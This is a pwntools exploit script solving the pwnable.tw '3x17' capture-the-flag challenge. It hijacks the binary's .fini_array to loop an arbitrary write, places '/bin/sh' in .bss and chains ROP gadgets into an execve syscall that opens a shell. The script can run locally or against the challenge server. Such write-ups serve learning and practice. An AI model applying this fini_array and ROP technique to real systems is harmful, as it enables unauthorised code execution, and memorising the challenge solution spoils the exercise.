from pwn import*
import argparse
context(arch='amd64',os='linux')
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

parser = argparse.ArgumentParser()
parser.add_argument('-r','--remote',action='store_true',help='-r -> remote')

args = parser.parse_args()

host = 'chall.pwnable.tw'
port = 10105

if args.remote:
    r = remote(host,port)
else:
    r = process('./3x17')
    gdb.attach(r)

def write_fini(addr, data):
    r.sendlineafter('addr:',str(addr))
    r.sendafter('data:',data)

elf = ELF('./3x17')

main = 0x401b6d
fini_call = 0x402960
fini = 0x4b40f0
bss = elf.bss()
pop_rax = 0x41e4af
pop_rsi = 0x406c30
pop_rdi = 0x401696
pop_rdx = 0x446e35
leave_ret = 0x401c4b
syscall = 0x481ca5

write_fini(fini, p64(fini_call) + p64(main))
write_fini(bss, '/bin/sh')
write_fini(fini + 16, p64(pop_rax) + p64(59))
write_fini(fini + 32, p64(pop_rdi) + p64(bss))
write_fini(fini + 48, p64(pop_rsi) + p64(0))
write_fini(fini + 64, p64(pop_rdx) + p64(0))
write_fini(fini + 80, p64(syscall))
write_fini(fini, p64(leave_ret))

r.interactive()
